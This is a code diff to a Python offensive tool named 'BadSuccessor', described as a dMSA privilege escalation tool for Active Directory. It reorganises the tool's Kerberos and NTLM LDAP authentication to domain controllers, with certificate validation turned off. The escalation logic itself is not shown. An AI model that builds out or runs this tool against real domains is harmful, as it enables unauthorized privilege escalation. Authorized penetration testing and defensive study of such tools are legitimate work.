@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 """
 BadSuccessor - dMSA Privilege Escalation Tool (Linux Version)
@@ -50,7 +51,6 @@ try:
     GSSAPI_AVAILABLE = True
 except ImportError:
     GSSAPI_AVAILABLE = False
-    print("Warning: python-gssapi not available. Kerberos auth will be limited.")
 
 class Colors:
     """ANSI color codes for terminal output"""
@@ -148,80 +148,6 @@ class BadSuccessor:
             return None, None, None
 
     def establish_ldap_connection(self, dc_ip, domain, username, password, use_ssl=False, port=None):
-        """Establish LDAP connection using Kerberos authentication"""
-        try:
-            # Determine port
-            if port is None:
-                port = 636 if use_ssl else 389
-
-            protocol = "LDAPS" if use_ssl else "LDAP"
-            self.log(f"Attempting Kerberos {protocol} connection to {dc_ip}:{port}", "INFO")
-
-            # Create server with SSL if requested
-            if use_ssl:
-                import ssl
-                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
-                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
-            else:
-                server = Server(dc_ip, port=port, get_info=ALL)
-
-            # Try different Kerberos authentication methods
-            conn = None
-
-            # Method 1: Use ccache file if provided
-            if ccache_file and os.path.exists(ccache_file):
-                self.log(f"Using Kerberos ccache: {ccache_file}", "INFO")
-                os.environ['KRB5CCNAME'] = ccache_file
-
-                if GSSAPI_AVAILABLE:
-                    try:
-                        conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
-                        if conn.bind():
-                            self.log("Kerberos authentication successful (ccache)", "SUCCESS")
-                        else:
-                            conn = None
-                    except Exception as e:
-                        self.log(f"GSSAPI Kerberos failed: {e}", "WARNING")
-                        conn = None
-
-            # Method 2: Get TGT with password and use impacket
-            elif password:
-                self.log("Attempting Kerberos authentication with password", "INFO")
-                tgt, cipher, sessionKey = self.get_kerberos_tgt(domain, username, password, dc_ip)
-
-                if tgt:
-                    # Try to use the TGT for LDAP connection
-                    # Note: This is simplified - in practice you'd need to implement
-                    # proper Kerberos LDAP authentication with the TGT
-                    self.log("TGT obtained, falling back to NTLM for LDAP", "WARNING")
-                    return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, port)
-
-            # Method 3: Use current Kerberos credentials (if available)
-            if not conn and GSSAPI_AVAILABLE:
-                try:
-                    self.log("Attempting Kerberos with current credentials", "INFO")
-                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
-                    if conn.bind():
-                        self.log("Kerberos authentication successful (current creds)", "SUCCESS")
-                    else:
-                        conn = None
-                except Exception as e:
-                    self.log(f"Current credentials Kerberos failed: {e}", "WARNING")
-                    conn = None
-
-            if conn:
-                # Get domain DN
-                domain_parts = domain.split('.')
-                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
-                self.log(f"Domain DN: {self.domain_dn}", "INFO")
-                return conn
-            else:
-                self.log("All Kerberos methods failed", "ERROR")
-                return None
-
-        except Exception as e:
-            self.log(f"Kerberos connection error: {e}", "ERROR")
-            return None
         """Establish authenticated LDAP connection"""
         try:
             # Determine port based on SSL preference
@@ -260,40 +186,84 @@ class BadSuccessor:
             self.log(f"{protocol} connection error: {e}", "ERROR")
             return None
 
+    def establish_kerberos_connection(self, dc_ip, domain, username, password=None, use_ssl=False, port=None, ccache_file=None):
+        """Establish LDAP connection using Kerberos authentication"""
+
+        if not GSSAPI_AVAILABLE:
+            self.log("GSSAPI not available, install with: pip3 install python-gssapi", "WARNING")
+            return None
+
+        try:
+            # Determine port
+            if port is None:
+                port = 636 if use_ssl else 389
+
+            protocol = "LDAPS" if use_ssl else "LDAP"
+            self.log(f"Attempting Kerberos {protocol} connection to {dc_ip}:{port}", "INFO")
+
+            # Create server with SSL if requested
+            if use_ssl:
+                import ssl
+                tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
+                server = Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ALL)
+            else:
+                server = Server(dc_ip, port=port, get_info=ALL)
+
+            # Try different Kerberos authentication methods
+            conn = None
+
+            # Method 1: Use ccache file if provided
+            if ccache_file and os.path.exists(ccache_file):
+                self.log(f"Using Kerberos ccache: {ccache_file}", "INFO")
+                os.environ['KRB5CCNAME'] = ccache_file
+
+                try:
+                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                    if conn.bind():
+                        self.log("Kerberos authentication successful (ccache)", "SUCCESS")
+                    else:
+                        conn = None
+                except Exception as e:
+                    self.log(f"GSSAPI Kerberos failed: {e}", "WARNING")
+                    conn = None
+
+            # Method 2: Get TGT with password and fallback to NTLM
+            elif password:
+                self.log("Attempting Kerberos authentication with password", "INFO")
+                tgt, cipher, sessionKey = self.get_kerberos_tgt(domain, username, password, dc_ip)
+
+                if tgt:
+                    self.log("TGT obtained, falling back to NTLM for LDAP", "WARNING")
+                    return self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, port)
+
+            # Method 3: Use current Kerberos credentials (if available)
+            if not conn:
+                try:
+                    self.log("Attempting Kerberos with current credentials", "INFO")
+                    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+                    if conn.bind():
+                        self.log("Kerberos authentication successful (current creds)", "SUCCESS")
+                    else:
+                        conn = None
+                except Exception as e:
+                    self.log(f"Current credentials Kerberos failed: {e}", "WARNING")
+                    conn = None
+
+            if conn:
+                # Get domain DN
+                domain_parts = domain.split('.')
+                self.domain_dn = ','.join([f'DC={part}' for part in domain_parts])
+                self.log(f"Domain DN: {self.domain_dn}", "INFO")
+                return conn
+            else:
+                self.log("All Kerberos methods failed", "ERROR")
+                return None
+
+        except Exception as e:
+            self.log(f"Kerberos connection error: {e}", "ERROR")
+            return None
+
     def establish_connection_with_fallback(self, dc_ip, domain, username, password, prefer_ssl=True, custom_port=None):
-        """Try different authentication methods with fallback"""
-
-        # Determine authentication preference
-        auth_methods = []
-        if auth_method == 'kerberos':
-            auth_methods = ['kerberos']
-        elif auth_method == 'ntlm':
-            auth_methods = ['ntlm']
-        else:  # auto
-            auth_methods = ['kerberos', 'ntlm']
-
-        for method in auth_methods:
-            self.log(f"Trying {method.upper()} authentication", "INFO")
-
-            if method == 'kerberos':
-                conn = self.establish_kerberos_connection(dc_ip, domain, username, password, prefer_ssl, custom_port, ccache_file)
-                if conn:
-                    return conn
-                self.log("Kerberos authentication failed, trying next method", "WARNING")
-
-            elif method == 'ntlm':
-                if custom_port:
-                    use_ssl = custom_port == 636
-                    conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)
-                    if conn:
-                        return conn
-                else:
-                    conn = self.establish_connection_with_fallback(dc_ip, domain, username, password, prefer_ssl, custom_port)
-                    if conn:
-                        return conn
-                self.log("NTLM authentication failed", "WARNING")
-
-        return None
         """Try LDAPS first, fallback to LDAP if needed"""
 
         if custom_port:
@@ -337,6 +307,41 @@ class BadSuccessor:
                 return conn
         except Exception as e:
             self.log(f"StartTLS failed: {e}", "WARNING")
+
+        return None
+
+    def establish_connection_with_auth_fallback(self, dc_ip, domain, username, password=None, prefer_ssl=True, custom_port=None, auth_method='auto', ccache_file=None):
+        """Try different authentication methods with fallback"""
+
+        # Determine authentication preference
+        auth_methods = []
+        if auth_method == 'kerberos':
+            auth_methods = ['kerberos']
+        elif auth_method == 'ntlm':
+            auth_methods = ['ntlm']
+        else:  # auto
+            auth_methods = ['kerberos', 'ntlm']
+
+        for method in auth_methods:
+            self.log(f"Trying {method.upper()} authentication", "INFO")
+
+            if method == 'kerberos':
+                conn = self.establish_kerberos_connection(dc_ip, domain, username, password, prefer_ssl, custom_port, ccache_file)
+                if conn:
+                    return conn
+                self.log("Kerberos authentication failed, trying next method", "WARNING")
+
+            elif method == 'ntlm':
+                if custom_port:
+                    use_ssl = custom_port == 636
+                    conn = self.establish_ldap_connection(dc_ip, domain, username, password, use_ssl, custom_port)
+                    if conn:
+                        return conn
+                else:
+                    conn = self.establish_connection_with_fallback(dc_ip, domain, username, password, prefer_ssl, custom_port)
+                    if conn:
+                        return conn
+                self.log("NTLM authentication failed", "WARNING")
 
         return None
 
